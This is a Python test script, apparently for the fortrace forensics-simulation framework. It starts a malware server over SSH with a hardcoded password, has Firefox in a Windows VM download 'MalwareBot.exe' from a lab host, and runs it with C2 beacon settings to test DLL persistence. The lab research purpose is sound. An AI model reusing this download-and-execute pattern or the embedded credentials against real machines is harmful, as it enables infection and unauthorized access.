#!/usr/bin/env python
# -*- coding: utf-8 -*-
#Tests DLL persistence of malware component in combination with download of the malware via Firefox

import sys
import time
import logging
import subprocess
import threading
import paramiko

try:
    from fortrace.core.vmm import Vmm
    from fortrace.utility.logger_helper import create_logger
    from fortrace.core.vmm import GuestListener

except ImportError as e:
    print("Import error in fortracemaster.py! " + str(e))
    sys.exit(1)


def create_vm(logger):
    # virtual_machine_monitor1 = Vmm(logger, linux_template='linux_template')
    macsInUse = []
    guests = []
    guestListener = GuestListener(guests, logger)
    virtual_machine_monitor1 = Vmm(macsInUse, guests, logger)
   # guest = virtual_machine_monitor1.create_guest(guest_name="l-guest01", platform="linux", boottime=None)
    guest = virtual_machine_monitor1.create_guest(guest_name="w-guest01", platform="windows", boottime=None)
    logger.debug("Try connecting to guest")

    while guest.state != "connected":
        logger.debug(".")
        time.sleep(1)

    logger.debug(guest.guestname + " is connected!")

    return guest

def start_malware_server(config):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect("192.168.122.219", username="fortrace-service", password="$Anfang01")
        ssh_stdin, ssh_stdout, ssh_stderr = ssh.exec_command("cd C:\users\fortrace-service\Desktop & MalwareServer.exe " + config)
        exit_status = ssh_stdout.channel.recv_exit_status()
        print("Malware Server: Error", exit_status)
        print("----------------------------------------------------------\n")
        print("Malware Server: \n")
        print(ssh_stderr.read())
        print(ssh_stdout.read())
        print("\n----------------------------------------------------------\n")
        return


def main():
    """
    Test Script for fortrace.

    :return: no return value
    """
    try:
        logger = create_logger('fortraceManager', logging.DEBUG)
        logger.info("This is a test script to check the functionallity of the fortrace library" + '\n')

        guest = create_vm(logger)

        serverThread = threading.Thread(target=start_malware_server, args=["server_config_dll_per.txt"])
        serverThread.start()
        browser_obj = guest.application("webBrowserFirefox", {'webBrowser': "firefox"})
        browser_obj.open(url="192.168.122.219:8080/MalwareBot.exe")
        while browser_obj.is_busy:
            time.sleep(2)
        time.sleep(60)
        browser_obj.press_tab_test()
        time.sleep(20)
        browser_obj.press_enter_test()
        time.sleep(30)
        guest.shellExec("C:\users\fortrace\Downloads\MalwareBot.exe dnsServer=192.168.122.219 webServer=192.168.122.219 webPort=7777 Beacon=1")
        serverThread.join()
        browser_obj.close()
        guest.shutdown('keep')
        while guest.isGuestPowered():
            time.sleep(1)
        time.sleep(10)
        serverThread = threading.Thread(target=start_malware_server, args=["server_config_normal.txt"])
        serverThread.start()
        time.sleep(5)
        guest.start()
        guest.waitTillAgentIsConnected()
        serverThread.join()
        time.sleep(60)
        guest.shutdown("keep")




######## CLEANUP ############# ERROR HANDLING
    except KeyboardInterrupt as k:
        logger.debug(k)
        logger.debug("KeyboardInterrupt")
        logger.debug(k)
        logger.debug(virtual_machine_monitor1)
        raw_input("Press Enter to continue...")
        virtual_machine_monitor1.clear()
        logger.debug("cleanup here")
        try:
            virtual_machine_monitor1.clear()
        except NameError:
            logger.debug("well, host1 was not defined!")

        exit(0)

    except Exception as e:
        logger.debug("main gets the error: " + str(e))
        logger.debug("cleanup here")
        raw_input("Press Enter to continue...")
        try:
            virtual_machine_monitor1.clear()
            subprocess.call(["/etc/init.d/libvirt-bin", "restart"])
        except NameError:
            logger.debug("well, host1 was not defined!")
        sys.exit(1)


if __name__ == "__main__":
    try:
        main()
    except:
        sys.exit(1)
